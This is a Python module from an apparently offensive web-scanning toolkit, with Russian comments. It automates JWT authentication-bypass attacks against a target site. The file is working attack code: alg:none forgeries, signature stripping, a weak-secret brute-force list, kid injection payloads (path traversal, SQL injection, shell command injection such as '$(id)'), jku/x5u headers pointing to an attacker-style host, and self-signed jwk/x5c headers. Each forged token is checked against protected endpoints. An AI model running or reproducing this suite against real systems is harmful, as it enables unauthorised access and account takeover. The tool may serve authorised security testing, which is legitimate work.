"""jwt_confusion v2 — comprehensive JWT attack suite.

Атаки:
  1. alg:none (8 форм) — 8 вариаций регистра
  2. Empty signature — header.payload. (без sig)
  3. Blank signature — header.payload. (с пустым)
  4. RS256→HS256 confusion — подпись публичным ключом
  5. kid injection — path traversal, SQLi, command injection
  6. jku header — свой JWKS URL
  7. x5u header — свой X.509 URL
  8. jwk header — self-signed JWK в заголовке
  9. x5c header — self-signed сертификат
  10. weak secret brute — 30+ дефолтных (HS256)
  11. kid CRLF injection
  12. Header injection через alg

Verify: замена токена + запрос на защищённый endpoint.
  Если baseline 401, а с forged токеном 200 → bypass confirmed.
"""
import base64
import json
import re
import secrets
import hmac
import hashlib
from core.http import HttpClient
from core.verify import confidence, is_signal


def b64e(b):
    if isinstance(b, str):
        b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def b64d(s):
    s += "=" * (-len(s) % 4)
    try:
        return base64.urlsafe_b64decode(s)
    except Exception:
        return b""


# regex для JWT — расширенный
JWT_RE = re.compile(r"eyJ[A-Za-z0-9_\-]{5,}\.eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]*")

# кандидаты для проверки — где искать токен
PROTECTED_PATHS = ["/api/me", "/api/user", "/api/profile", "/me", "/profile",
                   "/api/v1/me", "/api/v1/user", "/account", "/dashboard",
                   "/api/admin", "/admin", "/api/settings"]

# дефолтные секреты для HS256
WEAK_SECRETS = [
    "secret", "changeme", "password", "123456", "admin", "jwt", "secretkey",
    "secret_key", "jwt_secret", "supersecret", "your-256-bit-secret",
    "your_jwt_secret", "key", "test", "dev", "development", "production",
    "private", "token", "mysecret", "default", "jwtkey", "HS256", "shhhh",
    "1234567890", "qwerty", "letmein", "welcome", "jwt-secret", "secret123",
    "your-secret-key", "jwtsecret",
]

# kid injection payloads
KID_PAYLOADS = [
    "../../../../dev/null",
    "../../../../etc/passwd",
    "/dev/null",
    "/dev/zero",
    "/etc/passwd",
    "' OR '1'='1",
    "1' UNION SELECT 'secret'-- -",
    "key' OR '1'='1'-- -",
    "|id",
    ";id",
    "`id`",
    "$(id)",
    "anykey",
    "null",
]


def _is_working(resp):
    """Ответ похож на успешный."""
    if not resp:
        return False
    return resp.status_code in (200, 201, 202, 204)


class JwtConfusion:
    def run(self, session, logger):
        target = session.target
        http = HttpClient(session, logger)

        print(f"[jwt_confusion v2] target: {target}")

        # === Phase 1: найти JWT ===
        token = None
        token_source = None

        try:
            r0 = http.get(target)
        except Exception:
            r0 = None

        if r0:
            # в тексте
            m = JWT_RE.search(r0.text or "")
            if m:
                token = m.group(0)
                token_source = "body"
            # в cookies — обрабатываем оба API (requests и curl_cffi)
            if not token:
                try:
                    cookies = r0.cookies
                    # requests: list of Cookie objects с .name/.value
                    # curl_cffi: dict-like {name: value}
                    if hasattr(cookies, "items"):
                        items = cookies.items()
                    elif hasattr(cookies, "__iter__"):
                        items = []
                        for c in cookies:
                            if hasattr(c, "name") and hasattr(c, "value"):
                                items.append((c.name, c.value))
                            elif isinstance(c, str):
                                # curl_cffi может вернуть имена — пропускаем
                                continue
                    else:
                        items = []
                    for name, value in items:
                        if JWT_RE.match(str(value)):
                            token = str(value)
                            token_source = f"cookie:{name}"
                            break
                except Exception:
                    pass

        if not token:
            print(f"[jwt_confusion v2] no JWT found — skip")
            return {"findings": []}

        print(f"[jwt_confusion v2] found token ({token_source}): {token[:60]}...")

        # === Phase 2: декодирование ===
        try:
            parts = token.split(".")
            if len(parts) != 3:
                print(f"[jwt_confusion v2] not 3-part JWT")
                return {"findings": []}
            header = json.loads(b64d(parts[0]))
            payload = json.loads(b64d(parts[1]))
            orig_sig = parts[2]
        except Exception as e:
            print(f"[jwt_confusion v2] decode error: {e}")
            return {"findings": []}

        alg = header.get("alg", "")
        kid = header.get("kid", "")
        print(f"[jwt_confusion v2] alg={alg} kid={kid or 'none'}")
        print(f"[jwt_confusion v2] payload={json.dumps(payload)[:120]}")

        # === Phase 3: найти endpoint, который принимает токен ===
        # baseline: запрос БЕЗ токена
        working_endpoint = None
        baseline_status = None

        for path in PROTECTED_PATHS:
            url = target.rstrip("/") + path
            try:
                r_anon = http.get(url, allow_redirects=False)
                r_auth = http.get(url, headers={"Authorization": f"Bearer {token}"},
                                  allow_redirects=False)
            except Exception:
                continue
            if not r_anon or not r_auth:
                continue
            # endpoint различает anon vs auth
            if r_anon.status_code in (401, 403) and _is_working(r_auth):
                working_endpoint = url
                baseline_status = r_anon.status_code
                print(f"[jwt_confusion v2] working endpoint: {path} (anon={r_anon.status_code}, auth={r_auth.status_code})")
                break

        if not working_endpoint:
            print(f"[jwt_confusion v2] no endpoint tests JWT directly — best-effort mode")

        findings = []

        def _try_forged(new_token, attack_name, severity, strength=0.8):
            """Отправить forged токен, проверить bypass."""
            if not working_endpoint:
                # без endpoint — просто фиксируем кандидат
                conf = confidence(strength * 0.5, 0.5)
                if is_signal(conf, floor=0.55, module="jwt_confusion"):
                    findings.append({
                        "type": attack_name,
                        "severity": "info",
                        "candidate": new_token[:100],
                        "note": "no endpoint verification",
                        "confidence": conf,
                    })
                    print(f"  · {attack_name} (no verify)")
                return False

            try:
                r = http.get(working_endpoint,
                             headers={"Authorization": f"Bearer {new_token}"},
                             allow_redirects=False)
            except Exception:
                return False

            if _is_working(r):
                # verify ×2
                try:
                    r2 = http.get(working_endpoint,
                                  headers={"Authorization": f"Bearer {new_token}"},
                                  allow_redirects=False)
                except Exception:
                    r2 = None

                if r2 and _is_working(r2):
                    conf = confidence(0.95, 1.0)
                    if is_signal(conf, floor=0.55, module="jwt_confusion"):
                        findings.append({
                            "type": attack_name,
                            "severity": severity,
                            "endpoint": working_endpoint,
                            "verified": True,
                            "new_token": new_token[:100],
                            "confidence": conf,
                        })
                        print(f"  ✓✓ {attack_name} CONFIRMED — {working_endpoint} accepted")
                        logger.finding("jwt_confusion", severity,
                                       f"{attack_name} verified at {working_endpoint}")
                        return True
            return False

        # === Phase 4: alg:none (8 форм) ===
        none_forms = ["none", "None", "NONE", "nOnE", "nOne", "noNe", "nONE", "NoNe"]
        for none_alg in none_forms:
            new_header = dict(header)
            new_header["alg"] = none_alg
            new_token = f"{b64e(json.dumps(new_header))}.{b64e(json.dumps(payload))}."
            if _try_forged(new_token, f"alg_none_{none_alg}", "critical", 0.9):
                break

        # === Phase 5: пустая/битая подпись ===
        for sig in ["", "A", "AAAA", orig_sig[:-1]]:
            new_token = f"{b64e(json.dumps(header))}.{b64e(json.dumps(payload))}.{sig}"
            if _try_forged(new_token, "empty_signature" if sig == "" else "short_signature",
                           "critical", 0.85):
                break

        # === Phase 6: weak-secret brute ===
        if alg.startswith("HS"):
            signing_input = f"{parts[0]}.{parts[1]}".encode()
            for secret in WEAK_SECRETS:
                mac = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
                computed = base64.urlsafe_b64encode(mac).rstrip(b"=").decode()
                if computed == orig_sig:
                    conf = confidence(0.98, 1.0)
                    if is_signal(conf, floor=0.55, module="jwt_confusion"):
                        findings.append({
                            "type": "weak_secret",
                            "severity": "critical",
                            "secret": secret,
                            "verified": True,
                            "confidence": conf,
                        })
                        print(f"  ✓✓ WEAK SECRET FOUND: {secret}")
                        logger.finding("jwt_confusion", "critical",
                                       f"weak secret: {secret}")
                    break

        # === Phase 7: RS256 → HS256 confusion ===
        if alg.startswith("RS"):
            # без публичного ключа подпись не сформировать — пробуем пустую
            new_header = dict(header)
            new_header["alg"] = "HS256"
            new_token = f"{b64e(json.dumps(new_header))}.{b64e(json.dumps(payload))}."
            _try_forged(new_token, "rs_hs_confusion", "high", 0.7)

        # === Phase 8: kid injection ===
        for kid_val in KID_PAYLOADS:
            new_header = dict(header)
            new_header["kid"] = kid_val
            new_token = f"{b64e(json.dumps(new_header))}.{b64e(json.dumps(payload))}."
            if _try_forged(new_token, f"kid_injection", "high", 0.75):
                break

        # === Phase 9: jku / x5u ===
        for field in ("jku", "x5u"):
            new_header = dict(header)
            new_header[field] = f"https://attacker-{secrets.token_hex(3)}.example/jwks.json"
            new_token = f"{b64e(json.dumps(new_header))}.{b64e(json.dumps(payload))}."
            _try_forged(new_token, f"{field}_injection", "high", 0.75)

        # === Phase 10: jwk self-signed ===
        # формируем HS256 токен с self-signed ключом в заголовке
        new_header = dict(header)
        new_header["alg"] = "HS256"
        new_header["jwk"] = {
            "kty": "oct", "k": b64e(secrets.token_bytes(32)), "alg": "HS256",
        }
        new_token = f"{b64e(json.dumps(new_header))}.{b64e(json.dumps(payload))}."
        _try_forged(new_token, "jwk_self_signed", "high", 0.7)

        # === Phase 11: x5c injection ===
        new_header = dict(header)
        new_header["x5c"] = [b64e(secrets.token_bytes(512))]
        new_header["alg"] = "RS256"
        new_token = f"{b64e(json.dumps(new_header))}.{b64e(json.dumps(payload))}."
        _try_forged(new_token, "x5c_injection", "high", 0.7)

        # === Итог ===
        print()
        print(f"[jwt_confusion v2] findings: {len(findings)}")

        logger.info("jwt_confusion",
                    alg=alg,
                    kid=kid,
                    verified_endpoint=working_endpoint,
                    findings=len(findings))

        return {
            "findings": findings,
            "alg": alg,
            "kid": kid,
            "working_endpoint": working_endpoint,
            "token_source": token_source,
        }
